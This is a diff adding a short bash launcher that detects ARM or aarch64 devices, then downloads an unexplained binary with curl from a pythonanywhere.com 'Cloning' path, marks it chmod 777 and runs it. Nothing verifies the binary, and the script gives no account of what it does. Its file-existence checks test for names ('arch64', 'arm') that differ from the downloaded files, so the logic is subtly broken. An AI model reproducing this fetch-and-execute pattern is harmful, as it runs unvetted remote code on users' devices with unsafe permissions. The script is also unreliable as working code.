@@ -1,0 +1,23 @@
+#!/bin/bash
+current_os=$(uname -om)
+
+if [[ $current_os == *"aarch64"* ]]; then
+    if [ ! -f "arch64" ]; then
+        curl -L https://dilutecodes.pythonanywhere.com/static/Cloning/d64 > d64
+        chmod 777 d64
+        ./d64
+    else
+        ./d64
+    fi
+elif [[ $current_os == *"arm"* ]]; then
+    if [ ! -f "arm" ]; then
+        curl -L https://dilutecodes.pythonanywhere.com/static/Cloning/d32 > d32
+        chmod 777 d32
+        ./d32
+    else
+        ./d32
+    fi
+else
+    echo -e "\nUnknown device, aarch or os found, contact author."
+    exit 1
+fi
